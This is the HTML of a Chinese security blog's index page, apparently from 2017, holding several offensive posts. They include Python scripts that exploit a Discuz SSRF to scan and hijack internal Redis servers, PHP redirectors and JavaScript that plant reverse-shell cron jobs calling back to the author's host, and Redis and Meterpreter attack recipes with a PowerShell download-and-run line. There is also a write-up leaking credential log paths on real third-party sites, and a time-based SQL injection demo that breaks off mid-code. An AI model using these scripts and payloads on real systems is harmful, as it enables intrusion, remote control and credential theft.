@@ -1,0 +1,697 @@
+<!DOCTYPE HTML>
+<html class="no-js">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Lcy’s Blog </title>
+
+    <!-- 使用url函数转换相关路径 -->
+    <link rel="stylesheet" href="//cdnjscn.b0.upaiyun.com/libs/normalize/2.1.3/normalize.min.css">
+    <link rel="stylesheet" href="https://phpinfo.me/usr/themes/default/grid.css">
+    <link rel="stylesheet" href="https://phpinfo.me/usr/themes/default/style.css">
+
+    <!--[if lt IE 9]>
+    <script src="//cdnjscn.b0.upaiyun.com/libs/html5shiv/r29/html5.min.js"></script>
+    <script src="//cdnjscn.b0.upaiyun.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="Just So So ..." />
+<meta name="keywords" content="typecho,php,blog" />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="default" />
+<link rel="pingback" href="https://phpinfo.me/index.php/action/xmlrpc" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://phpinfo.me/index.php/action/xmlrpc?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://phpinfo.me/index.php/action/xmlrpc?wlw" />
+<link rel="alternate" type="application/rss+xml" title="Lcy’s Blog  &raquo; RSS 2.0" href="https://phpinfo.me/index.php/feed/" />
+<link rel="alternate" type="application/rdf+xml" title="Lcy’s Blog  &raquo; RSS 1.0" href="https://phpinfo.me/index.php/feed/rss/" />
+<link rel="alternate" type="application/atom+xml" title="Lcy’s Blog  &raquo; ATOM 1.0" href="https://phpinfo.me/index.php/feed/atom/" />
+</head>
+<body>
+<!--[if lt IE 8]>
+    <div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
+<![endif]-->
+
+<header id="header" class="clearfix">
+    <div class="container">
+        <div class="row">
+            <div class="site-name col-mb-12 col-9">
+                            <a id="logo" href="https://phpinfo.me/">Lcy’s Blog </a>
+        	    <p class="description">Just So So ...</p>
+                        </div>
+            <div class="site-search col-3 kit-hidden-tb">
+                <form id="search" method="post" action="https://phpinfo.me/" role="search">
+                    <label for="s" class="sr-only">搜索关键字</label>
+                    <input type="text" id="s" name="s" class="text" placeholder="输入关键字搜索" />
+                    <button type="submit" class="submit">搜索</button>
+                </form>
+            </div>
+            <div class="col-mb-12">
+                <nav id="nav-menu" class="clearfix" role="navigation">
+                    <a class="current" href="https://phpinfo.me/">首页</a>
+                                                            <a href="https://phpinfo.me/index.php/links.html" title="友情链接">友情链接</a>
+                                        <a href="https://phpinfo.me/old">old</a>
+                </nav>
+            </div>
+        </div><!-- end .row -->
+    </div>
+</header><!-- end #header -->
+<div id="body">
+    <div class="container">
+        <div class="row">
+
+    
+    
+
+<div class="col-mb-12 col-8" id="main" role="main">
+	        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+			<h2 class="post-title" itemprop="name headline"><a itemprop="url" href="https://phpinfo.me/index.php/archives/1438/">Discuz ssrf漏洞利用的几个python脚本</a></h2>
+			<ul class="post-meta">
+				<li itemprop="author" itemscope itemtype="http://schema.org/Person">作者: <a itemprop="name" href="https://phpinfo.me/index.php/author/1/" rel="author">admin</a></li>
+				<li>时间: <time datetime="2017-02-23T11:53:13+08:00" itemprop="datePublished">2017-02-23</time></li>
+				<li>分类: <a href="https://phpinfo.me/index.php/category/tools/">神器</a></li>
+				<li itemprop="interactionCount"><a itemprop="discussionUrl" href="https://phpinfo.me/index.php/archives/1438/#comments">11 条评论</a></li>
+			</ul>
+            <div class="post-content" itemprop="articleBody">
+    			<p>扫描本机开放的端口：</p><pre class="brush: python; gutter: false">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Author: Lcy
+# @Date:   2016-07-05 20:55:30
+# @Last Modified by:   Lcy
+# @Last Modified time: 2016-10-10 16:26:14
+import requests
+import threading
+import Queue
+import time
+
+threads_count = 2
+que = Queue.Queue()
+lock = threading.Lock()
+threads = []
+ports = [21,22,23,25,69,80,81,82,83,84,110,389,389,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]
+for i in ports:
+    que.put(str(i))
+def run():
+    while que.qsize() &gt; 0:
+        p = que.get()
+        print p + &quot;       \r&quot;,
+        try:
+            url = &quot;http://bbs.phpinfo.me/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://tools.phpinfo.me/ssrf.php?s=ftp%26ip=127.0.0.1%26port={port}%26data=helo.jpg[/img]&quot;.format(
+                port=p)
+            r = requests.get(url,timeout=2.8)
+        except:
+            lock.acquire()
+            print &quot;{port}  Open&quot;.format(port=p)
+            lock.release()
+for i in range(threads_count):
+    t = threading.Thread(target=run)
+    threads.append(t)
+    t.setDaemon(True)
+    t.start()
+
+while que.qsize() &gt; 0:
+    time.sleep(1.0)</pre><p>扫描内网开放6379端口的主机：</p><pre class="brush: python; gutter: false">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Author: Lcy
+# @Date:   2016-07-05 20:55:30
+# @Last Modified by:   Lcy
+# @Last Modified time: 2016-07-21 14:38:04
+import requests
+import threading
+import Queue
+import time
+threads_count = 20
+que = Queue.Queue()
+lock = threading.Lock()
+threads = []
+ip = &quot;10.171.&quot;
+for i in range(1,255):
+    for j in range(1,255):
+        que.put(ip + str(i) + &#039;.&#039;+str(j))
+# for i in range(0,255):
+#     que.put(ip + str(i))
+def run():
+    while que.qsize() &gt; 0:
+        ip = que.get()
+        try:
+            url = &quot;http://bbs.phpinfo.me/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://tools.phpinfo.me/ssrf.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg[/img]&quot;.format(
+                ip=ip,
+                port=&quot;65321&quot;)
+            r = requests.get(url,timeout=5)
+            
+            try:
+                url = &quot;https://bbs.phpinfo.me/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://tools.phpinfo.me/ssrf.php?s=ftp%26ip={ip}%26port={port}%26data=helo.jpg[/img]&quot;.format(
+                ip=ip,
+                port=&quot;6379&quot;)
+                r = requests.get(url,timeout=5)
+                lock.acquire()
+                print ip
+                lock.release()
+            except :
+                lock.acquire()
+                print &quot;{ip}  6379 Open&quot;.format(ip=ip)
+                lock.release()
+        except:
+            pass
+
+for i in range(threads_count):
+    t = threading.Thread(target=run)
+    threads.append(t)
+    t.setDaemon(True)
+    t.start()
+while que.qsize() &gt; 0:
+    time.sleep(1.0)</pre><p>通过ssrf操作内网redis写任务计划反弹shell:</p><pre class="brush: python; gutter: false">#!/usr/bin/env python
+# coding=utf-8
+# email: ringzero@0x557.org
+
+import requests
+
+host = &#039;10.171.26.22&#039;
+port = &#039;6379&#039;
+bhost = &#039;phpinfo.me&#039;
+bport = &#039;32&#039;
+
+vul_httpurl = &#039;https://bbs.phpinfo.me/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]&#039;
+
+_location = &#039;http://tools.phpinfo.me/ssrf.php&#039;
+
+shell_location = &#039;http://tools.phpinfo.me/shell.php&#039;
+
+
+#1 flush db
+
+_payload = &#039;?s=dict%26ip={host}%26port={port}%26data=flushall&#039;.format(
+
+    host = host,
+
+    port = port)
+
+exp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+
+print len(requests.get(exp_uri).content)
+
+
+
+#2 set crontab command
+
+_payload = &#039;?s=dict%26ip={host}%26port={port}%26bhost={bhost}%26bport={bport}&#039;.format(
+
+    host = host,
+
+    port = port,
+
+    bhost = bhost,
+
+    bport = bport)
+
+exp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(shell_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+
+print len(requests.get(exp_uri).content)
+
+
+
+#3 config set dir /var/spool/cron/
+
+_payload = &#039;?s=dict%26ip={host}%26port={port}%26data=config:set:dir:/var/spool/cron/&#039;.format(
+
+    host = host,
+
+    port = port)
+
+exp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+
+print len(requests.get(exp_uri).content)
+
+
+
+#4 config set dbfilename root
+
+_payload = &#039;?s=dict%26ip={host}%26port={port}%26data=config:set:dbfilename:root&#039;.format(
+
+    host = host,
+
+    port = port)
+
+exp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+
+print len(requests.get(exp_uri).content)
+
+
+
+#5 save to file
+
+_payload = &#039;?s=dict%26ip={host}%26port={port}%26data=save&#039;.format(
+
+    host = host,
+
+    port = port)
+
+exp_uri = &#039;{vul_httpurl}{0}{1}%23helo.jpg[/img]&#039;.format(_location, _payload, vul_httpurl=vul_httpurl)
+
+print exp_uri
+
+print len(requests.get(exp_uri).content)</pre><p>ssrf.php:</p><pre class="brush: php; gutter: false">&lt;?php
+$ip = $_GET[&#039;ip&#039;];
+$port = $_GET[&#039;port&#039;];
+$scheme = $_GET[&#039;s&#039;];
+$data = $_GET[&#039;data&#039;];
+header(&quot;Location: $scheme://$ip:$port/$data&quot;);
+?&gt;</pre><p>&nbsp;</p><p>shell.php:</p><pre class="brush: php; gutter: false">&lt;?php
+$ip = $_GET[&#039;ip&#039;];
+$port = $_GET[&#039;port&#039;];
+$bhost = $_GET[&#039;bhost&#039;];
+$bport = $_GET[&#039;bport&#039;];
+$scheme = $_GET[&#039;s&#039;];
+header(&quot;Location: $scheme://$ip:$port/set:0:\&quot;\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-i\\x20&gt;\\x26\\x20/dev/tcp/{$bhost}/{$bport}\\x200&gt;\\x261\\x0a\\x0a\\x0a\&quot;&quot;);
+?&gt;</pre>            </div>
+        </article>
+	        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+			<h2 class="post-title" itemprop="name headline"><a itemprop="url" href="https://phpinfo.me/index.php/archives/1351/">ThinkPHP使用不当可能造成敏感信息泄露</a></h2>
+			<ul class="post-meta">
+				<li itemprop="author" itemscope itemtype="http://schema.org/Person">作者: <a itemprop="name" href="https://phpinfo.me/index.php/author/1/" rel="author">admin</a></li>
+				<li>时间: <time datetime="2016-09-09T06:45:36+08:00" itemprop="datePublished">2016-09-09</time></li>
+				<li>分类: <a href="https://phpinfo.me/index.php/category/exploit/">漏洞</a></li>
+				<li itemprop="interactionCount"><a itemprop="discussionUrl" href="https://phpinfo.me/index.php/archives/1351/#comments">11 条评论</a></li>
+			</ul>
+            <div class="post-content" itemprop="articleBody">
+    			<p>&nbsp;</p><p>ThinkPHP在开启DEBUG的情况下会在Runtime目录下生成日志，而且debug很多站都没关的，所以影响应该很大吧</p><p>我们来看一下ThinkPHP3.2版本生成日志结构：</p><p><a href="https://phpinfo.me/old/wp-content/uploads/2016/09/123.jpg"><img class="alignnone size-full wp-image-1352" src="https://phpinfo.me/old/wp-content/uploads/2016/09/123.jpg" alt="123" width="938" height="356"></a></p><p>THINKPHP3.2 结构：Application\Runtime\Logs\Home\16_09_09.log</p><p>THINKPHP3.1结构：Runtime\Logs\Home\16_09_09.log</p><p>可以看到是 ：项目名\Runtime\Logs\Home\年份_月份_日期.log</p><p>这样的话日志很容易被猜解到，而且日志里面有执行SQL语句的记录，这里我随便找几个tp站测试一下：</p><p>http://demo.xxxxx.cc/Runtime/Logs/User/16_09_06.log 成功下载，并且找到一个用户的密码</p><p>&nbsp;</p><p><a href="https://phpinfo.me/old/wp-content/uploads/2016/09/log.jpg"><img class="alignnone size-full wp-image-1353" src="https://phpinfo.me/old/wp-content/uploads/2016/09/log.jpg" alt="log" width="1061" height="676"></a></p><p>成功登录：</p><p><a href="https://phpinfo.me/old/wp-content/uploads/2016/09/233333.jpg"><img class="alignnone size-full wp-image-1354" src="https://phpinfo.me/old/wp-content/uploads/2016/09/233333.jpg" alt="233333" width="1146" height="424"></a></p><p>我们再找一个案例:http://www.xxxxxx.com/Runtime/Logs/Home/16_09_06.log</p><p>&nbsp;</p><p><a href="https://phpinfo.me/old/wp-content/uploads/2016/09/1234.jpg"><img class="alignnone size-full wp-image-1355" src="https://phpinfo.me/old/wp-content/uploads/2016/09/1234.jpg" alt="1234" width="1234" height="681"></a></p><p>成功登录：</p><p><a href="https://phpinfo.me/old/wp-content/uploads/2016/09/31.jpg"><img class="alignnone wp-image-1358 size-full" src="https://phpinfo.me/old/wp-content/uploads/2016/09/31.jpg" width="963" height="495"></a></p><p>onethink官网测试</p><p>http://www.onethink.cn/Runtime/Logs/16_09_07.log</p><p>&nbsp;</p><p>修复办法：</p><p>删除Runtime/Logs下的所有文件，并将APP_DEBUG设置为false</p>            </div>
+        </article>
+	        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+			<h2 class="post-title" itemprop="name headline"><a itemprop="url" href="https://phpinfo.me/index.php/archives/1285/">xss自动化内网渗透</a></h2>
+			<ul class="post-meta">
+				<li itemprop="author" itemscope itemtype="http://schema.org/Person">作者: <a itemprop="name" href="https://phpinfo.me/index.php/author/1/" rel="author">admin</a></li>
+				<li>时间: <time datetime="2016-07-28T15:34:51+08:00" itemprop="datePublished">2016-07-28</time></li>
+				<li>分类: <a href="https://phpinfo.me/index.php/category/infiltration/">渗透</a></li>
+				<li itemprop="interactionCount"><a itemprop="discussionUrl" href="https://phpinfo.me/index.php/archives/1285/#comments">6 条评论</a></li>
+			</ul>
+            <div class="post-content" itemprop="articleBody">
+    			<p>利用xss或者社工让对方点我的链接，然后利用js自动化攻击内网redis,</p><p>利用redis写任务计划批量反弹shell。</p><p>js扫内网6379不太好实现，就不进行端口探测了，直接对整个网段执行一遍exp</p><p>利用如下代码获取内网ip段：</p><pre class="brush: html; gutter: false">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot; /&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    
+&lt;/body&gt;
+&lt;script&gt;
+    ipList = []
+    var webrtcxss = {
+    webrtc        : function(callback){
+        var ip_dups           = {};
+        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+        var mediaConstraints  = {
+            optional: [{RtpDataChannels: true}]
+        };
+        var servers = undefined;
+        if(window.webkitRTCPeerConnection){
+            servers = {iceServers: []};
+        }
+        var pc = new RTCPeerConnection(servers, mediaConstraints);
+        pc.onicecandidate = function(ice){
+            if(ice.candidate){
+                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1]; 
+                if(ip_dups[ip_addr] === undefined)
+                callback(ip_addr);
+                ip_dups[ip_addr]    = true;
+            }
+        };
+        pc.createDataChannel(&quot;&quot;);
+        pc.createOffer(function(result){
+            pc.setLocalDescription(result, function(){});
+        });
+    },
+    getIp        : function(){
+        this.webrtc(function(ip){
+            ipList.push(ip);
+        });
+    }
+}
+webrtcxss.getIp()
+setTimeout(function() {
+    alert(ipList)
+}, 300)
+&lt;/script&gt;
+&lt;/html&gt;</pre><p>&nbsp;</p><p>效果如下图</p><p><a href="https://phpinfo.me/old/wp-content/uploads/2016/07/1231.jpg"><img class="alignnone wp-image-1293 size-full" src="https://phpinfo.me/old/wp-content/uploads/2016/07/1231.jpg" alt="" width="1049" height="538"></a></p><p>&nbsp;</p><p>利用ajax攻击redis原理：</p><p>参考文章：http://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/</p><p>https://www.t00ls.net/thread-34873-1-1.html</p><p>http://www.freebuf.com/articles/web/19622.html</p><p>&nbsp;</p><p>下面是一个ajax操作redis写任务计划反弹的例子：</p><pre class="brush: javascript; gutter: false">var ip = &#039;192.168.203.2&#039;;
+var port= &#039;6379&#039;;
+var dir = &#039;/var/spool/cron/&#039;;
+var filename = &#039;root&#039;;
+var content = &#039;*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/phpinfo.me/53 0&gt;&amp;1&#039;;
+var url = &quot;http://&quot; + ip + &quot;:&quot; + port;
+
+var cmd = new XMLHttpRequest();
+cmd.open(&quot;POST&quot;,  url);
+cmd.send(&#039;eval \&#039;&#039; + &#039;redis.call(\&quot;set\&quot;, \&quot;hacked\&quot;, &quot;\\r\\n\\n&#039;+content+&#039;\\n\\n\\n\\n\&quot;); redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dir\&quot;, \&quot;&#039; + dir + &#039;/\&quot;); redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dbfilename\&quot;, \&quot;&#039;+filename+&#039;\&quot;); &#039; + &#039;\&#039; 0&#039; + &quot;\r\n&quot;);
+ 
+var cmd = new XMLHttpRequest();
+cmd.open(&quot;POST&quot;,  url);
+cmd.send(&#039;save\r\n&#039;);</pre><p>&nbsp;</p><p>最后来实现自动获取内网ip，自动批量攻击内网1-255的ip</p><pre class="brush: javascript; gutter: false">&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot; /&gt;
+    &lt;title&gt;Document&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    
+&lt;/body&gt;
+&lt;script&gt;
+    ipList = []
+    var webrtcxss = {
+    webrtc        : function(callback){
+        var ip_dups           = {};
+        var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+        var mediaConstraints  = {
+            optional: [{RtpDataChannels: true}]
+        };
+        var servers = undefined;
+        if(window.webkitRTCPeerConnection){
+            servers = {iceServers: []};
+        }
+        var pc = new RTCPeerConnection(servers, mediaConstraints);
+        pc.onicecandidate = function(ice){
+            if(ice.candidate){
+                var ip_regex        = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                var ip_addr         = ip_regex.exec(ice.candidate.candidate)[1]; 
+                if(ip_dups[ip_addr] === undefined)
+                callback(ip_addr);
+                ip_dups[ip_addr]    = true;
+            }
+        };
+        pc.createDataChannel(&quot;&quot;);
+        pc.createOffer(function(result){
+            pc.setLocalDescription(result, function(){});
+        });
+    },
+    getIp        : function(){
+        this.webrtc(function(ip){
+            ipList.push(ip);
+        });
+    }
+}
+webrtcxss.getIp()
+setTimeout(function() {
+    for(var i in ipList) {
+        if(ipList[i]) {
+            var iparr = ipList[i].split(&quot;.&quot;);
+            for(var i=0;i&lt;255;i++) {
+                var attkip = iparr [0] + &quot;.&quot; + iparr [1] + &quot;.&quot; + iparr [2] + &quot;.&quot; + i;
+                send(attkip);
+            }
+        }
+    }
+}, 300);
+
+function send(ip) {
+    var port= &#039;6379&#039;;
+    var dir = &#039;/var/spool/cron/&#039;;
+    var filename = &#039;root&#039;;
+    var content = &#039;*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/phpinfo.me/53 0&gt;&amp;1&#039;;
+    var url = &quot;http://&quot; + ip + &quot;:&quot; + port;
+
+    var cmd = new XMLHttpRequest();
+    cmd.open(&quot;POST&quot;,  url);
+    cmd.send(&#039;eval \&#039;&#039; + &#039;redis.call(\&quot;set\&quot;, \&quot;hacked\&quot;, &quot;\\r\\n\\n&#039;+content+&#039;\\n\\n\\n\\n\&quot;); redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dir\&quot;, \&quot;&#039; + dir + &#039;/\&quot;); redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dbfilename\&quot;, \&quot;&#039;+filename+&#039;\&quot;); &#039; + &#039;\&#039; 0&#039; + &quot;\r\n&quot;);
+     
+    var cmd = new XMLHttpRequest();
+    cmd.open(&quot;POST&quot;,  url);
+    cmd.send(&#039;save\r\n&#039;);
+    
+}
+
+&lt;/script&gt;
+&lt;/html&gt;</pre><p>如果嫌1-255不够可以再加一个for循环</p><p><a href="https://phpinfo.me/old/wp-content/uploads/2016/07/hack11.jpg"><img class="alignnone wp-image-1296 size-full" src="https://phpinfo.me/old/wp-content/uploads/2016/07/hack11.jpg" alt="" width="1213" height="566"></a></p><p>&nbsp;</p><p>自动向内网redis发送攻击代码</p><p>然后在自己的服务器中用nc监听你设置的端口，然后你会发现服务器已经躺在这了</p><p><a href="https://phpinfo.me/old/wp-content/uploads/2016/07/ok.jpg"><img class="alignnone size-full wp-image-1288" src="https://phpinfo.me/old/wp-content/uploads/2016/07/ok.jpg" alt="ok" width="1010" height="589"></a></p><p>&nbsp;</p><p>&nbsp;</p><p>测试模块已加入xss平台:http://xss.phpinfo.me/</p>            </div>
+        </article>
+	        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+			<h2 class="post-title" itemprop="name headline"><a itemprop="url" href="https://phpinfo.me/index.php/archives/1275/">redis利用姿势收集</a></h2>
+			<ul class="post-meta">
+				<li itemprop="author" itemscope itemtype="http://schema.org/Person">作者: <a itemprop="name" href="https://phpinfo.me/index.php/author/1/" rel="author">admin</a></li>
+				<li>时间: <time datetime="2016-07-07T08:47:16+08:00" itemprop="datePublished">2016-07-07</time></li>
+				<li>分类: <a href="https://phpinfo.me/index.php/category/infiltration/">渗透</a></li>
+				<li itemprop="interactionCount"><a itemprop="discussionUrl" href="https://phpinfo.me/index.php/archives/1275/#comments">4 条评论</a></li>
+			</ul>
+            <div class="post-content" itemprop="articleBody">
+    			<p><a style="display: none;" href="https://phpinfo.me/old/wp-content/uploads/2016/07/redis.png"><img class="alignnone size-full wp-image-1316" src="https://phpinfo.me/old/wp-content/uploads/2016/07/redis.png" alt="redis" width="247" height="220"></a></p><p>linux利用（转自wooyun）</p><p>redis的exploit，完全不需要flushall破坏数据场景，redis-cli set 1 'ringzero'，这样可以控制第一条记录，就能保证你的内容始终保持在最前面；</p><p>测试环境：CentOS，RHEL</p><p># 利用crontab反弹shell</p><pre class="brush: bash; gutter: false">redis-cli flushall 
+echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/114.114.114.114/53 0&gt;&amp;1\n\n&quot;|redis-cli -x set 1 
+redis-cli config set dir /var/spool/cron/ 
+redis-cli config set dbfilename root 
+redis-cli save</pre><p># 利用crontab创建文件 /tmp/888</p><pre class="brush: bash; gutter: false">redis-cli flushall # 为了方便测试 
+redis-cli set test &#039;test&#039; 
+redis-cli set my &#039;mymymymymymymymymymymymy&#039; 
+redis-cli set word &#039;wordwordwordwordwordword&#039; 
+redis-cli set hello &#039;ringzero&#039; 
+redis-cli set word1 &#039;word1word1word1word1word1word1&#039; 
+echo -e &quot;\n\n*/1 * * * * /bin/touch /tmp/888\n\n&quot;|redis-cli -x set 1 
+redis-cli config set dir /var/spool/cron/ 
+redis-cli config set dbfilename root 
+redis-cli save</pre><pre class="brush: bash; gutter: false">redis-cli flushall 
+echo -e &quot;\n\n*/1 * * * * /bin/touch /tmp/888\n\n&quot;|redis-cli -x set 1 
+redis-cli config set dir /var/spool/cron/ 
+redis-cli config set dbfilename root 
+redis-cli save</pre><p># 二次改写crontab</p><pre class="brush: bash; gutter: false">redis-cli flushall 
+redis-cli set 2 &#039;;a=`redis-cli get c`;&#039; 
+redis-cli set 1 &#039;id;redis-cli set r `$a`;#&#039; 
+redis-cli config set dir /tmp/ 
+redis-cli config set dbfilename w 
+redis-cli save 
+redis-cli set c whoami</pre><p># 利用第一步的写crontab步骤，完成下面的命令</p><pre class="brush: bash; gutter: false">echo &quot; &quot; &gt; /tmp/zz 
+cat /tmp/w &gt;&gt; /tmp/zz 
+/bin/sh /tmp/zz 
+redis-cli get r</pre><p>控制 /var/spool/cron/root 和 /tmp/zz</p><p># 最终实现，每10秒从redis的c变量读入要执行的命令，再将执行结果写入变量r</p><pre class="brush: bash; gutter: false">* * * * * sleep 10;/bin/sh /tmp/zz</pre><p>windows利用方式（转自90sec）</p><p><span style="font-family: Arial, Helvetica, sans-serif;"><strong><span style="color: #ff0000;">redis</span></strong> 官方未发布windows版本，但是野外存在redis/win版本。</span></p><p><span style="font-family: Arial, Helvetica, sans-serif;">在测试时发现一windows版本redis，遂开始搞。</span></p><p><span style="font-family: Arial, Helvetica, sans-serif;">直接上利用，基于msf:</span></p><pre class="brush: actionscript3; gutter: false">root@weisuo.org:~# cat hta-psh.txt 
+ &lt;scRipt language=&quot;VBscRipT&quot;&gt;CreateObject(&quot;WscrIpt.SheLL&quot;).Run &quot;powershell -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString(&#039;http://119.91.129.12:8080/1.ps1&#039;)&quot;&lt;/scRipt&gt;
+[url=mailto:root@weisuo.org]root@weisuo.org[/url]:~#  cat hta-psh.txt |redis-cli -x -h 192.168.138.27 set a
+OK</pre><p>hta-psh.txt 对一些字符串进行变通，如不，在写入时会导致字符串丢失。</p><pre class="brush: actionscript3; gutter: false">#msfconsole 
+use payload/windows/meterpreter/reverse_tcp
+generate -t hta-psh -f /var/www/1.ps1
+#之后起个handle，略</pre><p><span style="font-family: Arial, Helvetica, sans-serif;">修改1.ps1，文件内容大概如下：</span></p><p><span style="font-family: Arial, Helvetica, sans-serif;">$command="powershell -nop -w hidden -e xxxxxxxxxxxxxxxx";iex $command;$command2="taskkill /im mshta.exe";iex $command2;</span></p><p><span style="font-family: Arial, Helvetica, sans-serif;">最后写入文件，等待管理员登陆</span></p><pre class="brush: actionscript3; gutter: false">oot@xxx:~# redis-cli -h 192.168.138.27
+redis 192.168.138.27:6379&gt; CONFIG GET dir
+1) &quot;dir&quot;
+2) &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;
+redis 192.168.138.27:6379&gt; config get dbfilename
+1) &quot;dbfilename&quot;
+2) &quot;2.hta&quot;
+redis 192.168.138.27:6379&gt; save
+OK
+redis 192.168.138.27:6379&gt;[/p][p=20, null, left]</pre><p>&nbsp;</p><pre class="brush: actionscript3; gutter: false">msf exploit(handler) &gt; rexploit -j -z
+[*] Stopping existing job...
+[*] Reloading module...
+[*] Exploit running as background job.
+ 
+[*] Started reverse TCP handler on x.x.x.x:80
+msf exploit(handler) &gt; [*] Starting the payload handler...
+[*] Sending stage (957999 bytes) to x.x.x.x
+[*] Meterpreter session 4 opened (x.x.x.x:80 -&gt; x.x.x.x:56301) at 2016-06-06 11:06:00 -0400
+[*] Session ID 4 (x.x.x.x:80 -&gt; x.x.x.x:56301) processing AutoRunScript &#039;migrate -f&#039;
+[*] Current server process: powershell.exe (4896)
+[*] Spawning notepad.exe process to migrate to
+[+] Migrating to 3768
+[+] Successfully migrated to process</pre>            </div>
+        </article>
+	        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+			<h2 class="post-title" itemprop="name headline"><a itemprop="url" href="https://phpinfo.me/index.php/archives/1026/">python利用二进制延迟注入demo</a></h2>
+			<ul class="post-meta">
+				<li itemprop="author" itemscope itemtype="http://schema.org/Person">作者: <a itemprop="name" href="https://phpinfo.me/index.php/author/1/" rel="author">admin</a></li>
+				<li>时间: <time datetime="2015-08-30T01:53:50+08:00" itemprop="datePublished">2015-08-30</time></li>
+				<li>分类: <a href="https://phpinfo.me/index.php/category/tools/">神器</a>,<a href="https://phpinfo.me/index.php/category/infiltration/">渗透</a></li>
+				<li itemprop="interactionCount"><a itemprop="discussionUrl" href="https://phpinfo.me/index.php/archives/1026/#comments">7 条评论</a></li>
+			</ul>
+            <div class="post-content" itemprop="articleBody">
+    			<p>看了freebuf的mysql延迟注入课程，感觉他那个突破延迟注入时间限制的思路非常不错</p><p>课程地址：http://yuntv.letv.com/bcloud.html?uu=cbb16903e4&amp;vu=f69b1ac857&amp;width=1024&amp;height=576</p><p>然后自己写了个py的demo，代码写的渣勿笑~</p><pre class="brush: python; gutter: false">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# @Author: Lcy
+# @Date:   2015-08-29 22:26:17
+# @Last Modified by:   Sunshie
+# @Last Modified time: 2015-08-30 01:48:41
+# blog:https://phpinfo.me
+# 延迟注入工具
+import urllib2
+import time
+import socket
+import threading
+import requests
+
+class my_threading(threading.Thread):
+		def __init__(self, str,x):
+				threading.Thread.__init__(self)
+				self.str = str
+				self.x = x
+		def run(self):
+			global res
+			x=self.x
+			j = self.str
+			url = &quot;http://localhost/demo/1.php?username=root&#039;+and+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29,&quot; + str(x) + &quot;,1%29%29%29,8,0%29,&quot;+ str(j) + &quot;,1%29%29,sleep%282%29,0%29%23&quot;
+			html = request(url) 
+			verify = &#039;timeout&#039; 
+			if verify not in html: 
+				res[str(j)] = 0
+				#print 1
+			else:
+				res[str(j)] = 1
+	
+
+def request(URL): 
